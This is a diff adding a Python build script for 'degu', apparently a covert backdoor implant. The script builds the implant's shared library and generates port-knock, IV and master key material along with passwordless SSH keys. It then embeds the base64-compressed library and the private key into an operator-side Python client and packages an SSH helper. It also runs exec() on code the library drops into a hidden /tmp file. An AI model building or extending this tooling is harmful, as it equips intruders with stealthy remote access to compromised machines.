@@ -1,0 +1,244 @@
+#!/usr/bin/python3 
+import sys
+import os
+import re
+import argparse
+import subprocess
+import logging
+import binascii
+import random
+import string
+import time
+import ctypes
+import zlib
+import base64
+import shutil
+
+DEFAULT_OUTPUT = "/tmp/degu"
+PRODLIB = "degu.prod.so"
+DEBUGLIB = "degu.dbg.so"
+OUTLIB = "degu.so"
+
+LEVEL = logging.INFO
+
+
+class LogFmt(logging.Formatter):
+    """Class for log formatting."""
+
+    def format_time(self) -> str:
+        """Format time."""
+        return time.strftime("%H:%M.%S")
+
+    def _l(self, level: str) -> tuple:
+        clevel = {
+            "DEBUG": ("\033[0;36m", "\033[1;36m"),
+            "INFO": ("\033[0;35m", "\033[1;32m"),
+            "WARNING": ("\033[0;31m", "\033[1;31m"),
+            "CRITICAL": ("\033[0;31m", "\033[1;31m"),
+            "ERROR": ("\033[0;31m", "\033[1;31m"),
+        }
+        return clevel[level]
+
+    def format(self, record: logging.LogRecord) -> str:
+        header = (
+            f"{self._l(record.levelname)[0]}[{self._l(record.levelname)[1]}"
+            f"{self.format_time()}{self._l(record.levelname)[0]}]"
+            f"%8s" % record.levelname + self._l(record.levelname)[1] +
+            "  [%-5s]: " % record.name + "\033[0m"
+        )
+
+        return header + record.msg
+
+
+log = logging.getLogger('config')
+log.setLevel(LEVEL)
+ch = logging.StreamHandler()
+ch.setFormatter(LogFmt())
+log.addHandler(ch)
+
+
+def ex(build: list) -> subprocess.CompletedProcess:
+    try:
+        ret = subprocess.run(
+            build,
+            shell=True,
+            capture_output=True,
+            check=True
+        )
+        log.debug(ret.stdout.decode())
+        return ret
+    except subprocess.CalledProcessError as e:
+        log.error(f"error command : {' '.join(build)}")
+        log.error("\n" + e.stderr.decode().strip())
+        sys.exit(-1)
+
+def b64degu(lib: str) -> str:
+    with open(lib, "rb") as f:
+        lib = f.read()
+    clib = zlib.compress(lib)
+    blib = base64.b64encode(clib)
+    return blib.decode()
+
+
+def check_files(args: argparse.Namespace) -> None:
+    dest = args.dest if args.dest else DEFAULT_OUTPUT
+    if not os.path.exists(dest):
+        os.mkdir(dest, 0o700)
+        os.mkdir(dest+"/client", 0o700)
+
+    erase = any(os.path.exists(f"{dest}/{file}") for file in [PRODLIB, DEBUGLIB])
+    if not args.force and erase:
+        r = input("Remove libs? (y/n) ")
+        if r.lower() != "y":
+            sys.exit()
+
+def clean_degu() -> None:
+    log.debug("Cleaning degu")
+    ex(["make clean"])
+
+def build_debug(dest) -> None:
+    log.debug("Building debug degu")
+    ex(["DEBUG=yes make"])
+    shutil.copyfile(OUTLIB, f"{dest}/{DEBUGLIB}")
+    os.chmod(f"{dest}/{DEBUGLIB}", 0o755)
+    log.info(f"build {dest}/{DEBUGLIB}")
+
+
+def build_prod(dest) -> None:
+    log.debug("Building prod degu")
+    ex(["make"])
+    shutil.copyfile(OUTLIB, f"{dest}/{PRODLIB}")
+    os.chmod(f"{dest}/{PRODLIB}", 0o755)
+    log.info(f"build {dest}/{PRODLIB}")
+    
+
+def build_ssh(dest) -> None:
+    log.debug("Building ssh helper")
+    wd = os.getcwd()
+    os.chdir("degu-client/helpers/ssh")
+    ex([f'CGO_ENABLED=0 go build  -ldflags "-w" -o {dest}/client/degussh'])
+    os.chdir(wd)
+    log.info(f"build {dest}/client/degussh")
+
+
+def getpriv() -> str:
+    with open("keys.h") as f:
+        keys = f.read()
+    match = re.search(r'PRIVATE_KEY="([a-f0-9]+)"', keys)
+    return match.group(1) if match else ''
+
+def ssh_keygen(regen = False) -> None:
+    sshkeys_path="degu-client/helpers/ssh/keys"
+
+    if regen:
+        ex([f"rm -rf {sshkeys_path}/keydegussh {sshkeys_path}/keydegussh.pub {sshkeys_path}/hostkey {sshkeys_path}/hostkey.pub "])
+
+    if not os.path.exists(f"{sshkeys_path}/keydegussh"):
+        log.debug("generating ssh key")
+        ex([f'ssh-keygen -t ed25519  -f {sshkeys_path}/keydegussh -N "" -C ""'])
+
+    if not os.path.exists(f"{sshkeys_path}/hostkey"):
+        log.debug("generating ssh hostkey")
+        ex([f'ssh-keygen -t ed25519  -f {sshkeys_path}/hostkey -N "" -C ""'])
+
+
+def keygen(dest: str) -> None:
+    log.info("Generating new keys.h")
+    build_prod(dest)
+    file_path = '/tmp/.' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
+    lib = ctypes.CDLL(f"./{OUTLIB}")
+    lib.keygen(file_path.encode())
+
+    with open(file_path, "rb") as f:
+        toexec = f.read()
+    exec(toexec, globals())
+    os.unlink(file_path)
+    iv_hex = ["0x%02x" % c for c in binascii.unhexlify(iv)]
+    knock_hex = ["0x%02x" % c for c in binascii.unhexlify(knock)]
+    pub_hex = ["0x%02x" % c for c in binascii.unhexlify(pub)]
+
+    new_keys_content = (
+        f"#define IV            {{ {','.join(iv_hex)} }}\n"
+        f"#define KNOCK_KEY     {{ {','.join(knock_hex)} }}\n"
+        f"#define MASTER_PUBKEY {{ {','.join(pub_hex)} }}\n\n"
+        f'// PRIVATE_KEY="{priv}"\n'
+    )
+    
+    if os.path.exists("keys.h"):
+        overwrite = input("Are you sure you want to overwrite existing keys.h? (y/n) ")
+        if overwrite.lower() != "y":
+            sys.exit()
+
+    log.debug("Writing new keys.h")
+    
+    with open("keys.h", "w") as f:
+        f.write(new_keys_content)
+
+    print(new_keys_content)
+
+
+def make(args: argparse.Namespace, parser: argparse.ArgumentParser) -> None:
+    dest = args.dest if args.dest else DEFAULT_OUTPUT
+    check_files(args)
+
+    if args.rand:
+        keygen(dest)
+    if args.ssh:
+        ssh_keygen(regen=True)
+    
+    clean_degu()
+    
+    if args.build == "build":
+        build_debug(dest)
+        clean_degu()
+        build_prod(dest)
+
+        build_ssh(dest)
+        
+        b64lib = b64degu(OUTLIB)
+        clean_degu()
+        
+        with open("degu.tmpl.py") as f:
+            degupy_template = f.read()
+        degupy_content = degupy_template.replace("@@BASE64@@", b64lib).replace("@@PRIV@@", getpriv())
+        with open(f"{dest}/client/degu.py", "w") as f:
+            f.write(degupy_content)
+        log.info(f"generating {dest}/client/degu.py")
+
+        shutil.copyfile("keys.h",f"{dest}/client/keys.h")
+        log.info(f"wrote {dest}/client/keys.h")
+
+        shutil.copyfile("degu-client/helpers/ssh/degussh.py",f"{dest}/client/degussh.py")
+        log.info(f"wrote {dest}/client/degussh.py")
+        os.chmod(f"{dest}/client/degussh.py", 0o755)
+
+        shutil.copyfile("degu-client/helpers/ssh/keys/keydegussh",f"{dest}/client/keydegussh")
+        os.chmod(f"{dest}/client/keydegussh", 0o600)
+
+        log.info(f"wrote {dest}/client/keydegussh")
+        
+        shutil.copyfile("degu-client/dgu",f"{dest}/client/dgu")
+        log.info(f"wrote {dest}/client/dgu")
+
+    else:
+        parser.print_help()
+
+def command() -> None:
+    parser = argparse.ArgumentParser(description="DEGU build tool")
+    parser.add_argument('build', help="Build degu libs and produce python module")
+    parser.add_argument('-d', '--dest', type=str, help=f"Output directory (default {DEFAULT_OUTPUT})")
+    parser.add_argument('-r', '--rand', action='store_true', help="Generate new keys.h")
+    parser.add_argument('-s', '--ssh', action='store_true', help="Generate new ssh keys")
+    parser.add_argument('-f', '--force', action='store_true', help="Overwrite libraries")
+    parser.add_argument('-v', '--verbose', action='store_true', help=f"Verbose output")
+
+    args = parser.parse_args()
+    
+    if args.verbose:
+        log.setLevel(logging.DEBUG)
+
+    make(args, parser)
+
+
+if __name__ == "__main__":
+    command()
